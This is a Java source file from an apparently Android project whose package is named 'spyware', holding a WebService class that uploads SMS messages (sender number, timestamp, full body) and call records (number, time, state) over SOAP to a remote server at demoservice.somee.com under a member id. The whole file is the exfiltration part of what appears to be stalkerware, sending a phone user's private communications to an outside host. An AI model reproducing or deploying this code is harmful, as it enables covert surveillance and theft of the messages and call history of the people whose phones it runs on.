package com.example.tienbi.spyware.mode;

import org.ksoap2.SoapEnvelope;
import org.ksoap2.serialization.SoapObject;
import org.ksoap2.serialization.SoapPrimitive;
import org.ksoap2.serialization.SoapSerializationEnvelope;
import org.ksoap2.transport.HttpTransportSE;
import org.xmlpull.v1.XmlPullParserException;

import java.io.IOException;

/**
 * Created by TienBi on 11/09/2016.
 */
public class WebService {
    public static final String NAME_SPACE="http://demoservice.vn/";
    public static final String METHOD_NAME1="saveSMS";
    public static final String METHOD_NAME2="saveCall";
    public static final String SOAP_ACTION1=NAME_SPACE+METHOD_NAME1;
    public static final String SOAP_ACTION2=NAME_SPACE+METHOD_NAME2;
    public static final String URL="http://demoservice.somee.com/DemoService.asmx";
    public static final String key="003";

    public void saveSMS(String phoneNumber, String timeStamp,String body){
        SoapObject request = new SoapObject(NAME_SPACE,METHOD_NAME1);
        request.addProperty("phoneNumber",phoneNumber);
        request.addProperty("timeStamp",timeStamp);
        request.addProperty("body",body);
        request.addProperty("idmember",key);

        SoapSerializationEnvelope envelope=new SoapSerializationEnvelope(SoapEnvelope.VER11);
        envelope.dotNet =true;
        envelope.setOutputSoapObject(request);

        HttpTransportSE httpTransportSE = new HttpTransportSE(URL);
        try {
            httpTransportSE.call(SOAP_ACTION1,envelope);
            envelope.getResponse();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (XmlPullParserException e) {
            e.printStackTrace();
        }
    }
    public void saveCall(String phoneNumber, String time,int state){
        SoapObject request = new SoapObject(NAME_SPACE,METHOD_NAME2);
        request.addProperty("phoneNumber",phoneNumber);
        request.addProperty("time",time);
        request.addProperty("state",state+"");
        request.addProperty("idmember",key);

        SoapSerializationEnvelope envelope=new SoapSerializationEnvelope(SoapEnvelope.VER11);
        envelope.dotNet =true;
        envelope.setOutputSoapObject(request);

        HttpTransportSE httpTransportSE = new HttpTransportSE(URL);
        try {
            httpTransportSE.call(SOAP_ACTION2,envelope);
            envelope.getResponse();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (XmlPullParserException e) {
            e.printStackTrace();
        }
    }
}
